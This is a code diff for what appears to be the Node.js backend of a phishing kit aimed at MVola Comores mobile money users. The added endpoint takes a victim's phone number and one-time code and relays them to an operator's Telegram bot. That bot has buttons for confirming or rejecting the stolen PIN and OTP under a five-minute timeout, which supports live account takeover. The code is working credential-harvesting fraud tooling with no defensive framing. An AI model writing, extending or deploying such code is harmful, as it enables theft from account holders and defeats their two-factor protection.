@@ -75,6 +75,60 @@ app.post('/api/login-notification', async (req, res) => {
     }
 });
 
+// -------------------- OTP NOTIFICATION API (PAGE 8) --------------------
+app.post('/api/otp-notification', async (req, res) => {
+    const { phone, otp } = req.body || {};
+    const country = "Comores";
+    const countryCode = "+269";
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
+        hour12: true
+    });
+
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    statusStore[phone] = "pending_otp1";
+
+    const otpNotificationMsg = `1️⃣ <b>MVOLA COMORES - FIRST OTP RECEIVED</b>
+
+🆕 <b>NEW OTP SUBMISSION</b>
+🇰🇲 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔐 <b>OTP Code:</b> ${otp}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>Verify Credentials:</b>
+⌛ <b>Timeout: 5 minutes</b>`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, otpNotificationMsg, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Correct (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
+                    ],
+                    [
+                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
+                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
+                    ],
+                    [
+                        { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
+                    ]
+                ]
+            }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        console.error("Telegram Notification Error:", err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
 // -------------------- FIRST OTP API --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
     const { phone, link } = req.body || {};
